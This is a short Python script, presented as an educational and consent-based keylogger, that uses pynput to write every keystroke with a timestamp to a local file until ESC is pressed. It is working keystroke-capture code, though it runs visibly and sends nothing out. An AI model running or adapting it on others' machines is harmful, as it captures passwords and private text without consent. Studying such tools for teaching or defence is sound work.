"""
Simple Educational Keylogger (Consent-Based)
--------------------------------------------
This program logs keystrokes ONLY for educational purposes.
Run it only on systems you own or have explicit permission to test.

Controls:
- Press ESC to stop logging.
"""

from pynput import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now()} - [{key}]\n")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Logging stopped. File saved as keylog.txt")
        return False

if __name__ == "__main__":
    print("Educational Keylogger Started")
    print("Use only with permission. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
